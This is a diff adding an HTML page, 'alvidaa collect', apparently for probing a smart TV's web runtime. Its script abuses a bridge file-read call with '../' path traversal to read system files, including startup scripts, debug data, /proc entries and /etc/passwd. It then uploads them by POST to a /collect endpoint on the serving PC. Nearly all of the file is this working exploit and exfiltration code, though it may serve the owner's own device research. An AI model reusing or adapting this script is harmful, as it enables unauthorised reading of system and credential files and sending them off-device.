@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>alvidaa collect</title>
+<style>
+  html, body { margin: 0; padding: 0; background: #000; color: #ccc; }
+  #out { font: 20px/1.4 Menlo, Consolas, monospace; white-space: pre-wrap;
+         word-break: break-all; padding: 12px; }
+  .ok { color: #8f8; } .err { color: #f88; } .warn { color: #fd6; } .hdr { color: #6cf; }
+</style>
+</head>
+<body>
+<div id="out"></div>
+<script>
+(function () {
+  "use strict";
+  // Read-only: reads files through the bridge and POSTs them to /collect on
+  // this PC. Nothing on the TV is modified.
+  var el = document.getElementById("out");
+  function out(t, c) {
+    var d = document.createElement("div");
+    d.textContent = t;
+    if (c) d.className = c;
+    el.appendChild(d);
+  }
+
+  var PATHS = [
+    "../usr/local/scripts/start-kilby.sh",
+    "../usr/local/scripts/start-kilby1.sh",
+    "../usr/local/scripts/start-kilby2.sh",
+    "../usr/local/scripts/pfm-manager.sh",
+    "../var/local/pfmParse/PFMCheck",
+    "../var/local/pfmParse/Data/platform.txt",
+    "../var/local/pfmParse",
+    "../var/local/DebugPowerup",
+    "../var/local/DebugPFM_Ctrl",
+    "../var/local",
+    "../tmp/DebugPFM_Data",
+    "../var/local/vidaapp-persist.txt",
+    "../proc/mounts",
+    "../proc/version",
+    "../etc/passwd"
+  ];
+
+  function norm(m) {
+    if (m == null) return "";
+    if (typeof m === "string") return m;
+    try { return JSON.stringify(m); } catch (e) { return String(m); }
+  }
+
+  function read(p) {
+    try {
+      var r = HiUtils_createRequest("fileRead", { path: [p], mode: 6 });
+      if (r && typeof r === "object") {
+        return { ret: r.ret, code: r.code, msg: norm(r.msg).slice(0, 200000) };
+      }
+      return { ret: true, msg: norm(r).slice(0, 200000) };
+    } catch (e) { return { ret: false, msg: "EXC " + e }; }
+  }
+
+  async function main() {
+    out("alvidaa collect — reading and sending to the PC", "hdr");
+    var report = {
+      started: new Date().toISOString(),
+      ua: navigator.userAgent,
+      href: location.href,
+      files: {}
+    };
+    var okCount = 0;
+    for (var i = 0; i < PATHS.length; i++) {
+      var p = PATHS[i];
+      var r = read(p);
+      report.files[p] = r;
+      var yes = r.ret === true && String(r.msg).length > 0;
+      if (yes) okCount++;
+      out((yes ? "[OK]   " : "[--]   ") + p + "   " + String(r.msg).length + " chars",
+          yes ? "ok" : "warn");
+    }
+
+    out("");
+    out("sending to http://" + location.host + "/collect ...", "warn");
+    var res = "";
+    for (var attempt = 1; attempt <= 3; attempt++) {
+      try {
+        var x = await fetch("/collect", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(report)
+        });
+        res = "HTTP " + x.status;
+        if (x.ok) break;
+      } catch (e) { res = "EXC " + e; }
+      await new Promise(function (r) { setTimeout(r, 1200); });
+    }
+    out("upload: " + res + "   (" + okCount + "/" + PATHS.length + " files read)",
+        res === "HTTP 200" ? "ok" : "err");
+    out("");
+    out(res === "HTTP 200" ? "ГОТОВО — можно закрывать страницу" : "НЕ УШЛО — скажи, попробуем ещё",
+        res === "HTTP 200" ? "ok" : "err");
+  }
+
+  main().catch(function (e) { out("FATAL " + e, "err"); });
+})();
+</script>
+</body>
+</html>
